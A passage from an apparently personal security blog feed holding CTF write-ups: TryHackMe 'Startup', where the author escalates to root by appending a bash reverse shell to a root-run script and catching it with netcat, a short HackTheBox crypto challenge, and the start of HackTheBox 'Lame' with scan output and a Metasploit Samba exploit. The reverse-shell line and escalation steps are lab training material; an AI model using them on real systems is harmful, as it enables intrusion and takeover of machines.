&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There is a file called “recipe.txt”. when we cat this file we see the answer for the first Task of THM:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@startup:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;recipe.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can&lt;span class=&quot;s1&quot;&gt;'t keep it a secret forever and told him it was l***.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we can got for the User.txt file, whitch is located under the user lennie, because this is the only user on the target. We have to escalate our privilage to this user.&lt;/p&gt;

&lt;p&gt;At this moment i was stuck a quite long. Then i found an interesting file “suspicious.pcapng” in the incidents folder. 
This is a Wireshark capture and we can check if we find some interessting capture in there.&lt;/p&gt;

&lt;p&gt;So i downloaded the file and opened it with wireshark.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@startup:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;home
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;home
www-data@startup:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e
bash: &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;: l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e: Permission denied
www-data@startup:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e
www-data@startup:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e
bash: &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;: l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e: Permission denied
www-data@startup:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: c&lt;span class=&quot;k&quot;&gt;****************&lt;/span&gt;3

Sorry, try again.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: 

Sorry, try again.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: c&lt;span class=&quot;k&quot;&gt;****************&lt;/span&gt;3

&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;: 3 incorrect password attempts
www-data@startup:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After checking the file i decided to follow the TCP-Stream of the Wireshark file. 
I found some interessting information in this Stream, it looks like there was in cyper incident befor and the attacker tried to sudo -l with a password.&lt;/p&gt;

&lt;p&gt;At this moment my mind was thinking, could this the password for user “l&lt;em&gt;**&lt;/em&gt;e”, i gave it a try and yes. this was the password!&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@startup:/incidents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e
su l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e
Password: c&lt;span class=&quot;k&quot;&gt;****************&lt;/span&gt;3

l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:/incidents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I tried it with ssh if i can get a better bash on the target.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Documents  scripts  user.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash
l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Documents  scripts  user.txt
l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It Worked, now i have access via ssh and i can go for root permissions.&lt;/p&gt;

&lt;p&gt;But first lets cat the user.txt file and finished task 2 from THM!&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;THM&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;root-enumeration&quot;&gt;Root-Enumeration&lt;/h1&gt;

&lt;p&gt;Now we have access via ssh we can look int some userfiles. Or other missconfiguration of the target to get to the root rights.&lt;/p&gt;

&lt;p&gt;In the user directory there are tow folders:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;Documents  scripts  user.txt
l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first folder i was checking was the “scripts” folder. There is bash script called “planner.sh”. 
This script is calling another scirpt called “print.sh”&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~/scripts&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;planner.sh
&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LIST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /home/lennie/scripts/startup_list.txt
/etc/print.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lets find this file and check what is in the file:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~/scripts&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; print.sh 2&amp;gt;/dev/null
/etc/print.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file is located in the “/etc” folder and it is owned by l&lt;em&gt;**&lt;/em&gt;e and he has write access to the file:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~/scripts&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /etc/print.sh
&lt;span class=&quot;nt&quot;&gt;-rwx------&lt;/span&gt; 1 l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e 25 Nov  9 02:12 /etc/print.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;exploitation-to-root&quot;&gt;Exploitation to root&lt;/h1&gt;

&lt;p&gt;I was checking the cronjobs on the target, but i found nothing witch is calling the planner.sh scirpt in the user folder. But the “planner.sh” was owned by root. So i was thinking that there is a job running witch is calling the script.&lt;/p&gt;

&lt;p&gt;I have write access to the “print.sh” file. Maybe i can add a bash reverse-shell to the “print.sh” file and it will gave me a reverse-shell.&lt;/p&gt;

&lt;h1 id=&quot;weaponization-to-root&quot;&gt;Weaponization to root&lt;/h1&gt;

&lt;p&gt;I got the revese-shell from pentestmonky&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.9.170.39/8080 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I changed it to my ip address and added this to the “print.sh” file and started a listener on my machine:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.9.170.39/8080 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/print.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~/scripts&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/print.sh
&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Done!&quot;&lt;/span&gt;
l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~/scripts&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.9.170.39/8080 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/print.sh
l&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;e@startup:~/scripts&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/print.sh
&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Done!&quot;&lt;/span&gt;
bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.9.170.39/8080 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now i have to wait if there is a revershell comming back to me.&lt;/p&gt;

&lt;p&gt;After some minutes i got a reverse shell and i am logged in as root.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 8080
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8080 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.9.170.39] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.76.61] 41020
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1916&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
root@startup:~# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@startup:~# &lt;span class=&quot;nb&quot;&gt;whoami
whoami
&lt;/span&gt;root
root@startup:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So i rooted the target and i can read the root.txt file.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@startup:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
THM&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;f&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;d&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We now have closed all three task from THM and we shown the Startup-Company that the have to work on the security of there website.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;This Room had not much new things on it but the user escalation was very interessting. But for the access to the target i was stuck i quite long. The enumeration with the wireshark capture was very interessting, this is something i haven’t seen on any room of THM.&lt;/p&gt;

&lt;p&gt;As i saw the tag with cron, and i don’t really saw the cronjob running for the root escalation. I have to work on the cronjobs.&lt;/p&gt;

&lt;p&gt;But for some last words. It was interessting and i takes me 2h and 40min to get to root access.&lt;/p&gt;

&lt;p&gt;th4nks f0r r3ad1ng&lt;/p&gt;

&lt;p&gt;Fr3akazo1d&lt;/p&gt;
</description>
        <pubDate>Mon, 09 Nov 2020 23:14:00 +0000</pubDate>
        <link>/blog/startup/</link>
        <guid isPermaLink="true">/blog/startup/</guid>
      </item>
    
      <item>
        <title>Writeup - HTB - Templed</title>
        <description>&lt;h1 id=&quot;general-information&quot;&gt;General Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Platform&lt;/th&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
      &lt;th&gt;Time&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;HackTheBox&lt;/td&gt;
      &lt;td&gt;Templed&lt;/td&gt;
      &lt;td&gt;29.10.2020&lt;/td&gt;
      &lt;td&gt;Easy&lt;/td&gt;
      &lt;td&gt;Security, Templed, Cypher, Crypto, Challenge, HackTheBox, HTB&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The next challange of the beginner path is a crypto-challange were we have to decode a cyper.&lt;/p&gt;

&lt;p&gt;We have to download a zip file from HackTheBox and extract the file.&lt;/p&gt;

&lt;p&gt;After extracting we got an png file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/htb-images/Scroll.png&quot; alt=&quot;Scroll.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some research i came accross the Templed Cypher.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/htb-images/templed-cypher.png&quot; alt=&quot;templed-cypher.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So i had to figure out how the code is to decode:&lt;/p&gt;

&lt;p&gt;72 84 66 123 77 48 78 107 115 95 107 78 51 119 33 125&lt;/p&gt;

&lt;p&gt;Decode the symbols of the picture.&lt;/p&gt;

&lt;p&gt;No this code looks like decimal. I open https://www.asciitohex.com/ and convert it to ASCII.&lt;/p&gt;

&lt;p&gt;And i got the flag for this Challange.&lt;/p&gt;

&lt;p&gt;Th4nks 4 R3ad1ng&lt;/p&gt;

&lt;p&gt;Fr3akazo1d!&lt;/p&gt;

</description>
        <pubDate>Thu, 29 Oct 2020 23:14:00 +0000</pubDate>
        <link>/blog/templed/</link>
        <guid isPermaLink="true">/blog/templed/</guid>
      </item>
    
      <item>
        <title>Writeup - HTB - Lame</title>
        <description>&lt;h1 id=&quot;general-information&quot;&gt;General Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Platform&lt;/th&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
      &lt;th&gt;Time&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;HackTheBox&lt;/td&gt;
      &lt;td&gt;Lame&lt;/td&gt;
      &lt;td&gt;29.10.2020&lt;/td&gt;
      &lt;td&gt;Easy&lt;/td&gt;
      &lt;td&gt;Security, ctf, smbmap, msfconsole, CVE-2007-2447, Lame, HackTheBox, HTB&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;After a while i was back on HackTheBox. I started with the Beginner Track of HTB and Lame is the first box in this Track.&lt;/p&gt;

&lt;h1 id=&quot;used-programs&quot;&gt;Used Programs&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Program&lt;/th&gt;
      &lt;th&gt;Command&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;namp&lt;/td&gt;
      &lt;td&gt;nmap -sC -sV -oN nmap/initial lame.htb&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rustscan&lt;/td&gt;
      &lt;td&gt;rustscan lame.htb –ulimit 5000 – -sC -sV -oN nmap/initial  tee output&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ftp&lt;/td&gt;
      &lt;td&gt;ftp lame.htb&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;smbmap&lt;/td&gt;
      &lt;td&gt;smbmap -H lame.htb&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;msfconsole&lt;/td&gt;
      &lt;td&gt;use exploit/samba/usermap_script&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;rustscan&quot;&gt;RustScan&lt;/h1&gt;

&lt;p&gt;Rust Scan found 4 Open ports on the Target:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Open-Port&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;FTP-Service&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3632&lt;/td&gt;
      &lt;td&gt;distccd v1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;ruscan-output&quot;&gt;Ruscan-Output&lt;/h2&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Pen-Testing/HTB/Boxes]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rustscan 10.10.10.3 &lt;span class=&quot;nt&quot;&gt;--ulimit&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/initial | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;rustscan.txt 

     _____           _    _____
    |  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;        | |  / ____|
    | |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |   _ ___| |_| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___ __ _ _ __
    |  _  / | | / __| __|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; | &lt;span class=&quot;s1&quot;&gt;'_ \
    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |
    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|
    Faster nmap scanning with rust.

Automatically upping ulimit to 5000
Open 139
Open 445
Open 21
Open 3632
Starting nmap.
The Nmap command to be run is -sC -sV -oN nmap/initial -vvv -Pn -p 139,445,21,3632 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked '&lt;/span&gt;up&lt;span class=&quot;s1&quot;&gt;' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-29 23:34 CET
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 23:34
Completed Parallel DNS resolution of 1 host. at 23:34, 0.08s elapsed
DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:34
Scanning 10.10.10.3 [4 ports]
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Completed Connect Scan at 23:34, 0.05s elapsed (4 total ports)
Initiating Service scan at 23:34
Scanning 4 services on 10.10.10.3
Completed Service scan at 23:34, 11.18s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.10.3.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:34
NSE: [ftp-bounce 10.10.10.3:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.82% done; ETC: 23:35 (0:00:00 remaining)
Completed NSE at 23:35, 40.14s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.39s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.050s latency).
Scanned at 2020-10-29 23:34:38 CET for 52s

PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: -3d01h47m30s, deviation: 2h49m43s, median: -3d03h47m31s
